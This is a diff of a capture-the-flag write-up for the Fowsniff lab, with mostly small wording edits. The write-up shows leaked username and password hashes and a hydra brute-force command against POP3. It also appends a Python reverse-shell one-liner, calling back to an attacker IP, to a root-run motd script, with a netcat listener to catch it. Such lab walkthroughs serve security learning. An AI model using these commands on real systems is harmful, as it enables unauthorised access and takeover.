@@ -34,11 +34,11 @@ Open ports are 22,80 and 110/143 which are very interesting.
 
 #### 2. Enumeration
 
-I open the address in a browser and see a note with an interesting sentence:
+I open the address in a browser and see a note with an important sentence:
 
 `The attackers were also able to hijack our official @fowsniffcorp Twitter account. All of our official tweets have been deleted and the attackers may release sensitive information via this medium. We are working to resolve this at soon as possible.`
 
-So I type `"insite: @fowsniffcorp"`  in Google and get  two links, one of them is a pastebin with usernames and hashed passwords:
+So I type `"insite: @fowsniffcorp"`  in Google and get  two links. One of them is a pastebin with usernames and hashed passwords:
 
 ```
 mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
@@ -65,7 +65,7 @@ ae1644dac5b77c0cf51e0d26ad6d7e56:bilbo101
 4d6e42f56e127803285a0a7649b5ab11:orlando12
 f7fd98d380735e859f8b2ffbbede5a7e:07011972
 ```
-however `stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd` was not found, which after checking twitter account seems to be root.
+however `stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd`  could not be cracked.
 
 <br />
 
@@ -100,15 +100,17 @@ orlando12
 07011972
 ```
 
-Secondly, I use `hydra` contrary to metasploit recommended in challenge and run:
+Secondly, I use `hydra` contrary to metasploit recommended in challenge:
 
 `hydra -L users.txt -P pass.txt 10.10.211.152 pop3`
 
-which find a corresponding pair `seina:scoobydoo2`
+which finds a working pair `seina:scoobydoo2`
 
 <br />
 
-Another step is to access server using netcat and pop3 protocol. I type:
+Another step is to access server using netcat and pop3 protocol. 
+
+I type:
 
 `nc 10.10.211.152 110`
 
@@ -133,7 +135,7 @@ There are two messages which could be read with `retr`
 2 1280
 ```
 
-In first one, there is a ssh password
+In first one, there is ssh password
 
 `The temporary password for SSH is "S1ck3nBluff+secureshell"`
 
@@ -147,9 +149,9 @@ I tried all and third one works, giving access to machine.
 
 Our user has no sudo permissions, there are no flags in his folder either. I tought about finding some suid files but it didn't give anything.
 
-According to challenge's questions, I should pay attention in which group user is so I type `id`  andd see that he is in `users` group.
+According to challenge's questions, I should pay attention in which group user is, so I type `id`  and see that he belongs to `users` 
 
-So I thought about finding all files which can be accessed by `users` 
+I thought about finding all files which can be accessed by `users` 
 
 ```
 baksteen@fowsniff:~$ find / -type f -group users 2>/dev/null
@@ -170,6 +172,8 @@ baksteen@fowsniff:/opt/cube$ ls -al cube.sh
 ```
 
 This file is related with `motd.d` which is displayed as root in the beginning of a session.
+
+Let's check `/etc/update-motd.d/00-header`
 
 ```
 # cat 00-header
@@ -210,13 +214,13 @@ sh /opt/cube/cube.sh
 
 #### 5. Modifying `cube.sh` and getting shell
 
-I add python liner in the end of `cube.sh`
+I add python one liner in the end of `cube.sh`
 
 `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.170.47",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
 and exit machine.
 
-Right now, I run netcat in one terminal `sudo nc -lvnp 4444` and access machine once again `ssh baksteen@10.10.32.31`
+Right now, I run netcat in one terminal `sudo nc -lvnp 4444` and access it once again `ssh baksteen@10.10.32.31`
 
 Once I type password in that window, a new session as root will open in second:
 
@@ -263,3 +267,5 @@ Special thanks to psf, @nbulischeck and the whole Fofao Team.
 
 # 
 ```
+
+Great one.
